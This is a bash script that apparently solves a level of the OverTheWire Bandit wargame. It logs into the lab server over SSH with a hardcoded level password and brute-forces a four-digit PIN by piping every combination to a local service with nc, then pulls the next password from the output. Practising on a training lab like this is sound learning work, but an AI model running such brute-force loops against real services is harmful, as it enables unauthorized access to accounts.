#!/usr/bin/env bash

echo password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
ssh -p 2220 bandit24@bandit.labs.overthewire.org << EOF
    # Make tmp dir
    TMPDIR=\$(mktemp -d)

    # Navigate to tmp dir
    cd \$TMPDIR

    # feed all key combinations to the port
    for pin in {0000..9999}; do echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ \$pin"; done | \
    nc localhost 30002 >> out

    # sort the output for the password
    sort out | uniq -u | rev | cut -d ' ' -f 1 | tail -n 1 | rev

    # Cleanup
    cd ~
    rm -rf \$TMPDIR
EOF

